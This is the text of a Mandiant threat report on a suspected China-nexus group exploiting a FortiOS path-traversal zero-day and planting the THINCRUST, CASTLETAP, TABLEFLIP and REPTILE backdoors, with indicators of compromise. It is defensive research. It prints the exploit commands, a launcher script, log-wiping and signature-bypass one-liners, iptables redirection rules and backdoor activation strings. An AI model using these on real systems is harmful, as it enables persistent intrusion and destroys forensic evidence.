{
    "id": "6f7c96bb-7973-4647-90d7-2e541a1b6f43",
    "created_at": "2023-05-06T02:09:07.967197Z",
    "updated_at": "2024-11-22T02:03:17.499411Z",
    "deleted_at": null,
    "sha1_hash": "d440ae34bedfecba4c1cf2f3cf58cdf657f999f4",
    "title": "2023-03-16 - Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation",
    "authors": "",
    "file_creation_date": "2023-05-05T02:01:38Z",
    "file_modification_date": "2023-05-05T02:01:38Z",
    "file_size": 2059056,
    "plain_text": "Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in\nEspionage Operation\nmandiant.com/resources/blog/fortinet-malware-ecosystem\n\nCyber espionage threat actors continue to target technologies that do not support endpoint detection and response (EDR) solutions\nsuch as firewalls, IoT devices, hypervisors and VPN technologies (e.g. Fortinet, SonicWall, Pulse Secure, and others). Mandiant has\ninvestigated dozens of intrusions at defense industrial base (DIB), government, technology, and telecommunications organizations\nover the years where suspected China-nexus groups have exploited zero-day vulnerabilities and deployed custom malware to steal\nuser credentials and maintain long-term access to the victim environments.\nWe often observe cyber espionage operators exploiting zero-day vulnerabilities and deploying custom malware to Internet-exposed\nsystems as an initial attack vector. In this blog post, we describe scenarios where a suspected China-nexus threat actor likely\nalready had access to victim environments, and then deployed backdoors onto Fortinet and VMware solutions as a means of\nmaintaining persistent access to the environments. This involved the use of a local zero-day vulnerability in FortiOS (CVE-202241328) and deployment of multiple custom malware families on Fortinet and VMware systems. Mandiant published details of the\nVMware malware ecosystem in September 2022.\nIn mid-2022, Mandiant, in collaboration with Fortinet, investigated the exploitation and deployment of malware across multiple\nFortinet solutions including FortiGate (firewall), FortiManager (centralized management solution), and FortiAnalyzer (log\nmanagement, analytics, and reporting platform). The following steps generally describe the actions the threat actor took:\n1. Utilized a local directory traversal zero-day (CVE-2022-41328) exploit to write files to FortiGate firewall disks outside of the\nnormal bounds allowed with shell access.\n2. Maintained persistent access with Super Administrator privileges within FortiGate Firewalls through ICMP port knocking\n3. Circumvented firewall rules active on FortiManager devices with a passive traffic redirection utility, enabling continued\nconnections to persistent backdoors with Super Administrator privileges\n4. Established persistence on FortiManager and FortiAnalyzer devices through a custom API endpoint created within the device\n5. Disabled OpenSSL 1.1.0 digital signature verification of system files through targeted corruption of boot files\nMandiant attributes this activity to UNC3886, a group we suspect has a China-nexus and is associated with the novel VMware ESXi\nhypervisor malware framework disclosed in September 2022. At the time of the ESXi hypervisor compromises, Mandiant observed\nUNC3886 directly connect from FortiGate and FortiManager devices to VIRTUALPITA backdoors on multiple occasions.\n\n1/20\n\nMandiant suspected the FortiGate and FortiManager devices were compromised due to the connections to VIRTUALPITA from the\nFortinet management IP addresses. Additionally, the FortiGate devices with Federal Information Processing Standards (FIPS)\ncompliance mode enabled failed to boot after it was later rebooted. When FIPS mode is enabled, a checksum of the operating\nsystem is compared with the checksum of a clean image. Since the operating system was tampered by the threat actor, the\nchecksum comparison failed, and the FortiGate Firewalls protectively failed to startup. With assistance from Fortinet, Mandiant\nacquired a forensic image of these failing devices, prompting the discovery of the ICMP port knocking backdoor CASTLETAP.\n\nFortinet Ecosystem\nMultiple components of the Fortinet ecosystem were targeted by UNC3886 before they moved laterally to VMWare infrastructure.\nThese components and their associated versions, at the time of compromise, are listed as follows:\nFortiGate: 6.2.7 – FortiGate units are network firewall devices which allow for the control and monitoring of network traffic\npassing through the devices.\nFortiManager 6.4.7 – The FortiManager acts as a centralized management platform for managing Fortinet devices.\nFortiAnalyzer 6.4.7 –The FortiAnalyzer acts as a centralized log management solution for Fortinet devices as well as a\nreporting platform.\n\nScenario #1 (Summary): FortiManager Exposed to the Internet\nMandiant observed two distinct attack lifecycles where the threat actor abused Fortinet technologies to establish network access.\nThe first occurred when the threat actor initially gained access to the Fortinet ecosystem while the FortiManager device was exposed\nto the internet.\nDuring this attack lifecycle, as seen in Figure 1, backdoors disguised as legitimate API calls (THINCRUST) were deployed across\nboth FortiAnalyzer and FortiManager devices. Once persistence was established across the two devices, FortiManager scripts were\nused to deploy backdoors (CASTLETAP) across the FortiGate devices.\nMandiant observed SSH connections from the Fortinet devices to the ESXi servers, followed by the installation of malicious vSphere\nInstallation Bundles which contained VIRTUALPITA and VIRTUALPIE backdoors. This enabled the threat actor persistent access to\nthe hypervisors, and allowed the attacker to execute commands on guest virtual machines.\nMandiant has no evidence of a zero-day vulnerability being used to gain initial access or deploy the malicious VIBs at the time of\nwriting this post. VIRTUALPITA and VIRTUALPIE were discussed in more detail in a previous Mandiant blog post published in\nSeptember 2022.\n\n2/20\n\nFigure 1: Attack lifecycl­­e while FortiManager was accessible from the Internet\n\nScenario #2 (Summary): FortiManager Not Exposed to the Internet\nThe second attack lifecycle occurred where the FortiManager devices had network Access Control Lists (ACL) put in place to restrict\nexternal access to only TCP port 541 (FortiGate to FortiManager Protocol). During this attack lifecycle, as seen in Figure 2, the threat\nactor deployed a network traffic redirection utility (TABLEFLIP) and reverse shell backdoor (REPTILE) on the FortiManager device to\ncircumvent the new ACLs. With the redirection rules established by the TABLEFLIP utility, the threat actor was able to access the\nREPTILE backdoor directly from the Internet for continued access to the environment.\n\n3/20\n\nFigure 2: Activity after Internet access restrictions implemented to FortiManager\n\nScenario #1 (Detailed): FortiManager Exposed to the Internet\nThe technical details that follow describe the attack path taken by the threat actor when the FortiManager was initially exposed to the\nInternet.\n\nTHINCRUST Backdoor (Python-based Backdoor)\nMandiant’s analysis identified that upon initial connection to the FortiManager, the threat actor appended python backdoor code to a\nlegitimate web framework file. Mandiant classified this new malware family as THINCRUST.\nThe threat actor modified the legitimate file /usr/local/lib/python3.8/proj/util/urls.py to include an additional malicious API\ncall, show_device_info, which can be seen in Figure 3. This allowed the threat actor to interact with the THINCRUST backdoor\nthrough POST requests to the URI “/p/util/show_device_info”.\n\n4/20\n\nFigure 3: Comparison of urls.py\nWhen a POST request was sent to the show_device_info URL, it passed the request to the function get_device_info in\n/usr/local/lib/python3.8/proj/util/views.py. The get_device_info function contained the THINCRUST backdoor enabling\nthe threat actor to execute commands, write files to disk, and read files from disk depending on the cookies provided in the POST\nrequest as seen in Figure 4.\n\nFigure 4: THINCRUST backdoor python code\nThe get_device_info function relied on the presence of two (2) cookies, FGMGTOKEN and DEVICEID, within the POST requests. The\nFGMGTOKEN cookie is encrypted with an RSA key hardcoded into views.py and contained an RC4 key that decrypted the commands\nreceived through the DEVICEID cookie. The decrypted result of DEVICEID were a JSON encoded dictionary with the keys 'id' and\n'key'. As seen in Table 1, the 'id' value determined which action to execute within the backdoor, and the “key” value contained a string\nthat acted as the arguments for the action being performed.\nTable 1: get_device_info backdoor capabilities\nID\n\nCommand\n\n1\n\nExecute the command line stored in 'key'\n\n2\n\nWrite the contents of the HTTP request to the file stored in 'key'. The contents are RC4 encrypted\n\n5/20\n\n3\n\nRead the contents of the file stored in 'key' and transfer the contents RC4 encrypted to the client\n\nWhile most files in views.py had the @login_required decorator applied to them [decorators are any functions (Syntax to call\ndecorator: @<function_name>) that extend the behavior of another function without explicitly modifying the code], the malicious\nfunction get_device_info utilized the Django python module native to the system to add a @csrf_exempt decorator to the function\nas seen in Figure 5. This means that the POST request to the malicious API call did not require a login or CSRF token to\nsuccessfully run.\n\nFigure 5: @login_required vs @csrf_exempt decorators\nMandiant identified that a variant of this malicious API call was also present on a FortiAnalyzer device. While the backdoor function\nin views.py, get_device_info, was the same as FortiManager, the API call used to access the backdoor was changed to\n/p/utils/fortigate_syslog_send on the FortiAnalyzer device, as seen in Figure 6.\n\nFigure 6: FortiAnalyzer variant of urls.py: fortigate_syslog_send\n\nExploitation of CVE-2022-41328 on FortiGate Devices\nAfter persistence was established across the FortiManager and FortiAnalyzer devices with the THINCRUST backdoor, the threat\nactor deployed FortiManager scripts to multiple FortiGate firewalls. This activity was logged in the FortiGate elog as seen in Figure 7.\nFigure 7: FGFM script deployment log entry\nvd=\"root\"\ntype=\"event\"\nsubtype=\"system\"\nlevel=\"notice\" logdesc=\"Upload and run a script\"\nuser=”Fortimanager_Access”\nui=\"fgfmd\"\nmsg=\" User Fortimanager_Access via fgfmd upload and run script: <script_id> -- OK\"\n\nThe threat actor deleted these FortiManager scripts from the FortiManager device before they could be recovered for analysis, but\ncorrelation of multiple event log types show that the scripts took advantage of a path traversal vulnerability (CVE-2022-41328). The\nvulnerability was exploited by the threat actor using the command execute wireless-controller hs20-icon upload-icon (as\nseen in Figure 8). This command allowed the threat actor to overwrite legitimate files in a normally restricted system directory.\n\n6/20\n\nNormally, the execute wireless-controller hs20-icon upload-icon command is used to upload .ico files (icon files) from a\nserver to a FortiGate firewall using the File Transfer Protocol (“FTP”) or Trivial File Transfer Protocol (“TFTP”), where they can be\nused in HotSpot 2.0 Online Sign-Up (OSU) portals. HotSpot 2.0 is a technology which allows for devices to seamlessly switch\nbetween cellular data and public Wi-Fi.\nHowever, the execute wireless-controller hs20-icon upload-icon command suffered from two issues. The command did not\nvalidate the type of file being uploaded and was susceptible to a directory traversal exploit allowing a threat actor with Super\nAdministrator privileges to upload a file smaller than 65,535 bytes to any location on the file system. This means that outside of the\nsize constraints of the command,­­a threat actor could replace any legitimate system file on the FortiGate firewall.\nSuccessful exploitation of the vulnerability (CVE-2022-41328) is not logged in FortiGate elogs. Around the time of the FortiManager\nscript execution, the elogs recorded the threat actor’s failed attempts to overwrite the system file /bin/lspci using this exploit, seen\nin Figure 8.\nFigure 8: FortiGate elog failed command execution\nexecute wireless-controller hs20-icon upload-icon ftp ../../../../../../bin/lspci <TA FTP Server>\nexecute wireless-controller hs20-icon upload-icon tftp ../../../../../../bin/lspci <TA TFTP Server>\n\nFortinet confirmed the exploitation of this command was not seen prior to these events and assigned the designation CVE-202241328. Fortinet successfully replicated the exploit using the syntax seen in the failed command events.\nFurther supporting evidence of attempted exploitation was found in FortiGuard logs events with “file_transfer:\nTFTP.Server.Buffer.Overflow repeated X times” in the msg field. These events showed connections from the FortiGate firewalls\nto the FortiAnalyzer device, where the packet contents included the lscpi directory traversal string, as seen in Figure 9. A directory\ntraversal string with the filename node was also referenced in a similar event, which is another binary in the /bin/ directory of a\nFortiGate 6.2.7 device, but Mandiant only observed the threat actor replacing the lscpi binary successfully.\nFigure 9: IPS Sensor Logs - Attack Context Field\nPFBBVFRFUk5TPiAAATsuLi88L1BBVFRFUk5TPgo8VVJJPiA8L1VSST4KPEhFQURFUj4gPC9IRUFERVI+CjxCT\n0RZPiA8L0JPRFk+CjxQQUNLRVQ+IAABLi4vLi4vLi4vLi4vLi4vLi4vYmluL2xzcGNpAG9jdGV0ADwvUEFDS0\nVUPg==\nBase 64 Decoded\n<PACKET> ..../../../../../../bin/lspci.octet.</PACKET>\n\nSymlink to Suspected Backdoor (/bin/lspci -> /bin/sysctl)\nMandiant reviewed file listings from multiple FortiGate firewalls in search of modified versions of /bin/lspci based on the failed\ncommands seen within FortiGate logs. In total, two variants of /bin/lspci were identified; a standalone version of the binary and a\nversion which was symlinked to /bin/sysctl. Fortinet confirmed that /bin/lspci should always be a standalone binary.\nFile listing entries for /bin/lspci and /bin/sysctl on the compromised FortiGate firewalls contained similar timestamps that did not\nalign with other legitimate binaries on the FortiGate machines. Additionally, the file size for /bin/sysctl on the compromised\nFortiGate firewall was much larger than reported on non-compromised devices.\nUnder normal circumstances, the command ‘diagnose hardware lscpi’ is used to list PCIe devices connected to the FortiGate\nfirewall, but once the threat actor replaced the legitimate lspci binary with a symlink, the diagnostic command could execute the\nsysctl file the threat actor modified instead.\nThe file listing snippets in Figure 10 and Figure 11 highlight the differences across the original and modified versions of /bin/lspci\nand /bin/sysctl present on the FortiGate firewalls.\nFigure 10: Compromised FortiGate firewall with malicious entries for /bin/lspci and /bin/sysctl\n\n7/20\n\nCOMPROMISED-FGT101F # fnsysctl ls -la /bin\n...\nlrwxrwxrwx\n\n1 root\n\nroot\n\n9 Oct 18 13:09 lldptx -> /bin/init\n\nlrwxrwxrwx\n\n1 root\n\nroot\n\n9 Oct 18 13:09 lnkmtd -> /bin/init\n\nlrwxrwxrwx\n\n1 root\n\nroot\n\n11 Oct 19 05:11 lspci -> /bin/sysctl\n\nlrwxrwxrwx\n\n1 root\n\nroot\n\n9 Oct 18 13:09 lted -> /bin/init\n\nlrwxrwxrwx\n\n1 root\n\nroot\n\n9 Oct 18 13:09 memuploadd -> /bin/init\n\n1 root\n\nroot\n\n...\n-rwxr-xr-x\n\n1478216 Oct 19 05:11 sysctl\n\n...\n\nFigure 11: Non-Compromised FortiGate firewall with legitimate entries for /bin/lspci and /bin/sysctl\nNON-COMPROMISED-FGT101F # fnsysctl ls -la /bin\n...\nlrwxrwxrwx\n\n1 0\n\n0\n\nFri Sep\n\n2 12:07:55 2022\n\n9 lldptx -> /bin/init\n\nlrwxrwxrwx\n\n1 0\n\n0\n\nFri Sep\n\n2 12:07:55 2022\n\n9 lnkmtd -> /bin/init\n\n-rwxr-xr-x\n\n1 0\n\n0\n\nFri Sep\n\n2 12:07:55 2022\n\nlrwxrwxrwx\n\n1 0\n\n0\n\nFri Sep\n\n2 12:07:55 2022\n\n9 lted -> /bin/init\n\nlrwxrwxrwx\n\n1 0\n\n0\n\nFri Sep\n\n2 12:07:55 2022\n\n9 memuploadd -> /bin/init\n\n1 0\n\n0\n\nFri Sep\n\n2 12:07:55 2022\n\n131736 lspci\n\n...\n-rwxr-xr-x\n\n251480 sysctl\n\n...\n\nIn addition to the differences in modification time and size, the output of the file listing command fnsysctl ls -l /bin displayed\nmultiple fields in different formats and order. This is likely due to the threat actor replacing /bin/sysctl and therefore changing the\nshell functionality on the FortiGate firewall. Changes made to the FortiOS file system are not persistent, so the files were unable to\nbe recovered for analysis.\nBy default, Fortinet devices running FortiOS have an archive on disk labelled rootfs.gz within the /data/ partition. Upon boot, this\nfile is mounted as the root filesystem. This means if modifications are made to the mounted image, the changes will not be persistent\nunless they are written to the rootfs.gz archive. FortiGate firewalls do not support files being exported from the mounted filesystem\nduring runtime. Since the modifications made to /bin/lspci and /bin/sysctl were not written to the rootfs.gz archive, they were\nnot installed persistently and could not be further analyzed.\nMandiant coordinated with Fortinet to obtain a forensic image of the compromised FortiGate firewalls and better identify the expected\ncontents of the devices. Comparing the forensic image of the compromised FortiGate firewall to a known-good version, Fortinet\nidentified a trojanized firmware that contained a persistent backdoor. Mandiant refers to the backdoor as a new malware family\nnamed CASTLETAP.\n\nCASTLETAP (FortiGate Firewall Backdoor)\nAnalysis on the FortiGate firewalls identified an additional malicious file /bin/fgfm. Analysis of /bin/fgfm determined it to be a\npassive backdoor, named CASTLETAP, that listened for a specialized ICMP packet for activation. The threat actor likely named the\nfile ‘fgfm’ in an attempt to disguise the backdoor as the legitimate service ‘fgfmd’ which facilitates communication between the\nFortiManager and FortiGate firewalls.\nOnce executed, CASTLETAP created a raw promiscuous socket to sniff network traffic. CASTLETAP then filtered and XOR decoded\na 9-byte magic activation string in the payload of an ICMP echo request packet. Table 2 shows the magic strings interpreted by\nCASTLETAP and their resultant actions.\n\n8/20\n\nTable 2: CASTLETAP magic string options\nMagic String\n\nDescription\n\n1qaz@WSXa\n\nParse C2 information from ICMP payload and connect to it over SSL.\n\nhpaVAj2FJ\n\nKills CASTLETAP process.\n\nTo decode the C2 information within the ICMP packet, a single-byte XOR key was derived from the Epoch date stamp to decrypt the\npayload data. This meant the encoding standard changed every day. Figure 12 show the formula that was used to calculate the XOR\nkey.\nFigure 12: CASTLETAP XOR key calculation\n((year + 1900 + month * (year + 1900)) * date) % 255\nyear: index starting from 1900 i.e. current_year-1900\nmonth: index starting from 0\ndate: index starting from 1\n\nTable 3 defines the payload structure of the ICMP packet expected by CASTLETAP.\nTable 3: CASTLETAP ICMP packet structure\nByte Index/Range\n\nPayload Section Description\n\n<0x00-0x01>\n\n<flag indicating whether to create clone or not>\n\n<0x01-0x02>\n\n<unused>\n\n<0x02-0x0c>\n\n<9-byte magic string + null byte>\n\n<0x0c-0x10>\n\n<XOR encoded C2 IP>\n\n<0x10-0x15>\n\n<XOR encoded port>\n\nWhen the C2 IP address and port was parsed from the activation packet, CASTLETAP initiated a connection to the C2 over an SSL\nsocket. Once this connection was established, CASTLETAP expected the C2 server to initiate a handshake with the 16-byte\nsequence seen in Figure 13, echoing the same sequence in response.\nFigure 13: CASTLETAP handshake sequence\n0x58, 0x90, 0xAE, 0x86, 0xF1, 0xB9, 0x1C, 0xF6, 0x29, 0x83, 0x95, 0x71, 0x1D, 0xDE, 0x58, 0x0D\n\nOnce connected to the C2, CASTLETAP could accept multiple types of commands over SSL, as seen in Table 4.\nTable 4: CASTLETAP command key\nCommand\n\nDescription\n\n0x1\n\nUpload file (to victim)\n\n0x2\n\nDownload file (from victim)\n\n0x3\n\nSpawn busybox based command shell, otherwise fallback to a normal command shell.\n\n9/20\n\n0x4\n\nContinue receiving\n\n0x5\n\nReceive complete\n\nWhen a command was successfully received, the backdoor returned the sequence ‘;7(Zu9YTsA7qQ#vw’ as an acknowledgement\ntoken; this same string was also sent to signal session termination.\nOnce CASTLETAP was deployed to the FortiGate firewalls, the threat actor connected to ESXi and vCenter machines. The threat\nactor deployed VIRTUALPITA and VIRTUALPIE to establish persistence, allowing for continued access to the hypervisors and the\nguest machines. This is described in further detail in the blog post, “Bad VIB(E)s Part One: Investigating Novel Malware Persistence\nWithin ESXi Hypervisors.”\n\nScenario #2 (Detailed): FortiManager Not Exposed to the Internet\nThe technical details that follow describe the attack path taken by the threat actor where the FortiManager had network Access\nControl Lists (ACL) set up to restrict external access.\n\nRegaining Access to the Internet-restricted FortiManager\nWhen ACLs were implemented on the FortiManager device, the threat actor lost direct public access to device. To regain access to\nthe FortiManager, the threat actor pivoted from a FortiGate Firewall compromised with CASTLETAP. The threat actor then deployed\nthe following three (3) malicious files, seen in Table 5, to the FortiManager upon successful reconnection.\nTable 5: Attack Lifecycle 2 Malware Key\nMalware\nFamily\n\nFile Path\n\nDescription\n\nN/A\n\n/bin/support\n\nLaunches /bin/auth and /bin/klogd and deletes the two files along with /bin/support\nfrom disk.\n\nTABLEFLIP\n\n/bin/auth\n\nA passive utility to setup network traffic redirection from a specific IP address\ndestined to the FortiManager on TCP port 541 to another specified port.\n\nREPTILE\n\n/bin/klogd\n\nA backdoor utility that listens for a specialized packet for activation.\n\nThe file /bin/support (MD5: 9ce2459168cf4b5af494776a70e0feda) served as a launch script to execute /bin/klogd (REPTILE\nvariant) and /bin/auth (TABLEFLIP). The attacker modified the startup file /etc/init.d/localnet to execute the line ‘nohup\n/bin/support &’ so the script would run every time the system was rebooted. Since the running FortiOS file system was an\nephemeral copy of the archive rootfs.gz, the files would be deleted from the ephemeral copy after being loaded into memory and\npersist in the rootfs.gz archive, a file not accessible to users without pulling a forensic image. The contents of /bin/support can\nbe seen in Figure 14.\nFigure 14: Contents of /bin/support\n#!/bin/bash\n#cp /bin/sh /bin/top\nsleep 30\n/bin/klogd\n/bin/auth\nrm -rf /bin/klogd\nrm -rf /nohup.out\nrm -rf /bin/support\n\nTABLEFLIP (Traffic Redirection Utility)\n10/20\n\nTo enable continued access directly from the Internet, the threat actor implemented TABLEFLIP (MD5:\nb6e92149efaf78e9ce7552297505b9d5), a passive traffic redirection utility that listens on all active interfaces for specialized command\npackets. With this utility in place, and regardless of the ACL’s in place, the threat actor would be able to connect directly to the\nFortiManager as seen in Figure 15.\n\nFigure 15: TABLEFLIP behavior\nTABLEFLIP was configured to listen on all active interfaces for TCP packets and searches at the start of the TCP payload for the\nfollowing magic packet, shown in Figure 16, for packets destined for port TCP 541.\nFigure 16: TABLEFLIP magic number sequence\n17 03 01 01 D8 54 2F 31\n\nIf the magic number was found, the malware extracted a XOR key from offset 0xB of the TCP payload. This key was used as a seed\nfor XOR based sequential decryption. TCP payload offset 0xC onwards was decrypted using this scheme. Figure 17 shows the\nstructure of the payload.\n\n11/20\n\nFigure 17: TABLEFLIP payload structure\nstruct _payload\n{\n_DWORD magic_dword1;\n_DWORD magic_dword2;\n_BYTE unused[3];\n_BYTE xor_key;\n_DWORD command;\n_DWORD ip;\n_WORD port;\n};\n\nThe malware then attempted to extract the command, IP, and port from the payload. Table 6 describes the command and actions\ntaken when a command was recognized.\nTable 6: TABLEFLIP capabilities key\nCommand\n\nDescription\n\n0xFFFEFDFC\n\nEnable redirection for traffic with source IP matching extracted IP and port 541 to extracted destination port\n\n0xFCFDFEFF\n\nDisable redirection for traffic with source IP matching extracted IP and specified destination port\n\nTraffic redirection was accomplished by adding iptables rules on the FortiManager system as seen in Figure 18. with the source IP\nand redirection port specified in the command packet. iptables was executed to check if a PREROUTING rule for that IP and port\ncombination already existed. If the combination was not found, a new redirection rule was added in the PREROUTING chain. The\nrules under the PREROUTING chain were processed immediately once the packet is received on an interface.\nFigure 18: iptables rule to implement traffic redirection\niptables -t nat -S PREROUTING | grep <src_ip> | grep <redirection_port> || iptables -t nat -A PREROUTING -p\ntcp -s <src_ip> --dport 541 -j REDIRECT --to-port <redirection_port>\n\nWhen assigned to delete traffic redirection, TABLEFLIP utilized the grep command to filter on all lines in the PREROUTING chain\nwhich contained the IP address and redirection port of interest, capturing the appropriate rule id’s with awk. These id’s were passed\nback to iptables with xargs to have them removed from the PREROUTING chain, as seen in Figure 19.\nFigure 19: iptables rule to disable traffic redirection\niptables -t nat -S PREROUTING | tail -n +2 | grep -n -E '<src_ip>.*< redirection_port>' | awk -F: '{print\n$1}'| xargs iptables -t nat -D PREROUTING\n\nREPTILE (Backdoor)\nTo achieve persistent access on the FortiManager device, the threat actor deployed a backdoor with the filename /bin/klogd (MD5:\n53a69adac914808eced2bf8155a7512d) that Mandiant refers to as REPTILE, a variant of a publicly available Linux kernel module\n(LKM) rootkit. With the assistance of TABLEFLIP, the threat actor was able to successfully forward traffic and access the REPTILE\nbackdoor using iptables traffic redirection rules.\nOnce executed, REPTILE created a packet socket to receive OSI layer 2 packets. When a packet was received, the backdoor would\nperform the check seen in the pseudocode in Figure 20 to determine if a magic string was present.\nFigure 20: REPTILE magic string detection pseudocode\n\n12/20\n\nsingle_byte_xor_key = (month * year) * day % 255\nindex = 2 * data_received_on_port_8[7];\ndata_to_decode_ptr = *((char *)&data[index + 12] + 1)\ni = 0\nwhile ( i < strlen(data_to_decode) )\ndecoded_data[i] = data_to_decode_ptr[i++] ^ single_byte_xor_key;\nstrncmp(&decoded_data, \"mznCvqSBo\", 9)\n\nTable 7 shows the magic strings interpreted by REPTILE and their resultant actions.\nTable 7: REPTILE magic string options\nMagic String\n\nDescription\n\nmznCvqSBo\n\nParse C2 information from OSI layer 2 packet and connects to it over SSL.\n\nhpaVAj2FJ\n\nKills REPTILE process (Only searched for if first magic string not found)\n\nSimilar to the method used by CASTLETAP to decode the C2 information, REPTILE derived a single-byte XOR key from the Epoch\ndate stamp to decrypt payload data, which caused the encryption key to change daily. Figure 21 shows the formula that was used to\ncalculate the XOR key.\nFigure 21: REPTILE XOR key calculation\n(month * (year + 1900)) * day % 255\nyear: index starting from 1900 i.e. current_year-1900\nmonth: index starting from 0\ndate: index starting from 1\n\nIf the magic string “mznCvqSBo” was found, a reverse shell was created with the C2 IP address and destination port extracted from\nthe rest of the activation packet payload. When the first magic string was not present, the binary searched for the second magic\nstring “hpaVAj2FJ\n”. If this second magic string was found, the REPTILE process will end.\nIf no magic strings were found, the backdoor continued to listen for other connections.\n\nThreat Actor Anti-Forensics\nClearing and Modifying Logs\nMandiant analyzed the system memory of the FortiManager and identified threat actor commands used to clear specific events that\ncontained the threat actor’s IP address from multiple log sources. The commands seen in Figure 22 were utilized by the threat actor\nto remove log entries containing the IP address used to connect to the THINCRUST backdoor.\nFigure 22: Threat actor’s anti-forensics commands\necho > /var/log/django.log; \\\necho > /var/log/apache2/error_log; \\\nsed -i ‘/<ipaddress>/d’ /var/log/apache2/*log; \\\nls -alt /var/log/ /var/log/apache2/\n\nDisabling File System Verification on Startup\n\n13/20\n\nIn an attempt to skip digital signature verification checks made to the file system on boot, the threat actor added the command seen\nin Figure 23 to the startup config /etc/init.d/localnet within the rootfs.gz archive of both FortiManager and FortiAnalyzer\ndevices.\nFigure 23: /etc/init.d/localnet – DD Command\nprintf \"t\" | dd of=/bin/smit bs=1 count=1 conv=notrunc seek=22866 2>/dev/null\n\nComparing the compromised /bin/smit (a388ebaef45add5da503e4bf2b9da546) with a clean version from both FortiManager and\nFortiAnalyzer, the modified binary contained a single byte difference. The modified location within /bin/smit is executed when the\nmount command line argument is given on system startup. Normally, the mount function would perform OpenSSL 1.1.0 digital\nsignature verification checks on the files in Figure 24 against /data/.fmg_sign, but this modification changed a conditional jump\ninstruction to an unconditional jump instruction which always skipped digital signature verification checks normally made on the\nsystem files.\nFigure 24: Files normally checked by /bin/smit\n/data/extlinux.sys\n/data/extlinux.conf\n/data/boot.msg\n/data/vmlinuz\n/data/rootfse-fe\n\nSince the mount command executes prior to /etc/init.d/localnet on system startup, the dd command will overwrite the 22,866th\nbyte of /bin/smit with the character “t”, reverting the binary to a state that appears as if it was never tampered with, even if the file\nwas hashed.\n\nAttribution\nUNC3886 is an advanced cyber espionage group with unique capabilities in how they operate on-network as well as the tools they\nutilize in their campaigns. UNC3886 has been observed targeting firewall and virtualization technologies which lack EDR support.\nTheir ability to manipulate firewall firmware and exploit a zero-day indicates they have curated a deeper-level of understanding of\nsuch technologies. UNC3886 has modified publicly available malware, specifically targeting *nix operating systems.\nAnother threat cluster unrelated to UNC3886, suspected to be from China has recently been observed targeting zero-day\nvulnerabilities in Fortinet as reported by Mandiant in mid-January of 2023. Mandiant continues to gather evidence and identify\noverlaps between UNC3886 and other groups that are attributed to Chinese APT.\n\nConclusion\nThe activity discussed in this blog post is further evidence that advanced cyber espionage threat actors are taking advantage of any\ntechnology available to persist and traverse a target environment, especially those technologies that do not support EDR solutions.\nThis presents a unique challenge for investigators as many network appliances lack solutions to detect runtime modifications made\nto the underlying operating system and require direct involvement of the manufacturer to collect forensic images. Cross\norganizational communication and collaboration is key to providing both manufacturers with early notice of new attack methods in the\nwild before they are made public and investigators with expertise to better shed light on these new attacks.\nMandiant recommends organizations using the ESXi and the VMware infrastructure suite follow the hardening steps outlined in this\nblog post to minimize the attack surface of ESXi hosts.\n\nAcknowledgements\nSpecial thanks to Jeremy Koppen, Kirstie Failey, Bryce Bucklin, Jay Smith, Nicholas Luedtke, Ronnie Salomonsen, Nino Isakovic,\nCharles Carmakal, and Fortinet PSIRT for their assistance with the investigation, technical review, and creating detections for the\nmalware families discussed in this blog post. In addition, we would also like to thank Fortinet and VMware for their collaboration on\nthis research.\nFortinet released two additional resources covering CVE-2022-41328 and an analysis of identified attacker activity.\n\n14/20\n\nMITRE ATT&CK Techniques\nImpact\nT1565.001: Stored Data Manipulation\nDefense Evasion\nT1027:\nObfuscated Files or Information\nT1070:\nIndicator Removal\nT1070.003: Clear Command History\nT1070.004: File Deletion\nT1078:\nValid Accounts\nT1140:\nDeobfuscate/Decode Files or Information\nT1202:\nIndirect Command Execution\nT1218.011: Rundll32\nT1222:\nFile and Directory Permissions Modification\nT1497:\nVirtualization/Sandbox Evasion\nT1497.001: System Checks\nT1620:\nReflective Code Loading\nCredential Access\nT1552:\nUnsecured Credentials\nT1555.005: Password Managers\nDiscovery\nT1016:\nT1033:\nT1057:\nT1082:\nT1083:\nT1087:\nT1518:\n\nSystem Network Configuration Discovery\nSystem Owner/User Discovery\nProcess Discovery\nSystem Information Discovery\nFile and Directory Discovery\nAccount Discovery\nSoftware Discovery\n\nCollection\nT1074.001: Local Data Staging\nT1560:\nArchive Collected Data\nT1560.001: Archive via Utility\nExecution\nT1059:\nCommand and Scripting Interpreter\nT1059.001: PowerShell\nT1059.003: Windows Command Shell\nT1059.004: Unix Shell\nT1059.006: Python\nT1129:\nShared Modules\nCommand and Control\nT1095:\nNon-Application Layer Protocol\nT1102.001: Dead Drop Resolver\nT1105:\nIngress Tool Transfer\nT1571:\nNon-Standard Port\nT1573.001: Symmetric Cryptography\nLateral Movement\nT1021.004:\n\nSSH\n\n15/20\n\nIndicators of Compromise\nType\n\nValues\n\nDescription\n\nFortiGate\nCommand\n\nexecute wireless-controller hs20-icon upload-icon ftp ../../../../../../bin/lspci <TA\nFTP Server>\n\nAttempted execution of this command\nor similar commands containing\ndirectory traversal are indicative of\nattempted exploitation of CVE-202241328 to upload a file to a normally\nrestricted directory\n\nFortiGate\nCommand\n\nexecute wireless-controller hs20-icon upload-icon tftp ../../../../../../bin/lspci <TA\nTFTP Server>\n\nAttempted execution of this command\nor similar commands containing\ndirectory traversal are indicative of\nattempted exploitation of CVE-202241328 to upload a file to a normally\nrestricted directory\n\nFilename\n\n/bin/fgfm\n\nCASTLETAP Sample found on a\nFortiGate device\n\nSymlinked\nFile\n\n/bin/lspci -> /bin/sysctl\n\nlspci should be a standalone binary\nwithin FortiGate devices. A symlink\nsuggests that a modification was made\nto the file system\n\nURI\n\n/p/util/show_device_info\n\nAn API call which created by the threat\nactor which acted as a persistent\nbackdoor on FortiManager devices\n\nURI\n\n/p/utils/fortigate_syslog_send\n\nAn API call which created by the threat\nactor which acted as a persistent\nbackdoor on FortiAnalyzer devices\n\nPython\nFunction\n\nget_device_info\n\nA malicious python function added to\n/usr/local/lib/python3.8/proj/util/views.py\non FortiAnalyzer and FortiManager\ndevices which provided threat actors\nwith a persistent backdoor\n\nFilename\n\n/bin/support\n\nThreat actor script which launches\n/bin/auth (TABLEFLIP) and /bin/klogd\n(REPTILE) and deletes the two files\nalong with /bin/support from disk\n\nFilename\n\n/bin/auth\n\nTABLEFLIP Sample - A passive utility\nto setup traffic redirection from a\nspecific IP address destined to the\nFortiManager on TCP541 to another\nspecified port.\n\nFilename\n\n/bin/klogd\n\nREPTILE - A backdoor utility that\nlistens for a specialized packet 